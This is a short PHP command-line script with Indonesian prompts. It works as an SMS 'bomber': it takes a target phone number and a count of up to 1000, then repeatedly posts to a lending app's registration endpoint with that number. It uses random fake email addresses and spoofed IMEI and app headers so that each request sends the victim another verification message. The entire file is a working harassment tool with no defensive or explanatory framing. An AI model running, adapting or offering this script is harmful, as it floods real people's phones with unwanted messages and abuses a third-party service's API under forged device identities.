<?php

echo "Masukan nomer target (ex:081288883333): ";
$nomerHp  = trim(fgets(STDIN));
echo "Masukan jumlah BOM: ";
$amount = trim(fgets(STDIN));

if(!empty($nomerHp) and !empty($amount)){

  if($amount > 1000){
    echo "
Jangan Lebih dari 1000!";
  }else{
    for($i=1;$i<=$amount;$i++){
      $ch = curl_init();

      curl_setopt($ch, CURLOPT_URL, 'https://gateway.ukuindo.com/entrance/v2/register/first');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"'.$nomerHp.'","mail":"lala'.rand(11111,99999).'@gmail.com","channel":"GooglePlay"}');
      curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

      $headers = array();
      $headers[] = 'Host: gateway.ukuindo.com';
      $headers[] = 'Accept: application/json';
      $headers[] = 'Device: ANDROID';
      $headers[] = 'Imei: '.rand(1111111111,9999999999);
      $headers[] = 'Version: 48';
      $headers[] = 'Versioncode: 3.6.5';
      $headers[] = 'Accept-Language: id_ID';
      $headers[] = 'Channel: GooglePlay';
      $headers[] = 'Product: yinni';
      $headers[] = 'Content-Type: application/json';
      $headers[] = 'User-Agent: okhttp/3.12.1';
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

      $result = curl_exec($ch);
      if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
      }
      curl_close($ch);

      if(strlen(json_decode($result,true)['data']['tempToken']) > 5){
        echo "
Sukses Bom Nomer [".$i."]";
      }else{
        echo "
Gagal Bom";
      }
      sleep(2);
    }
  }
}else{
  echo "Masukan semua parameter";
}
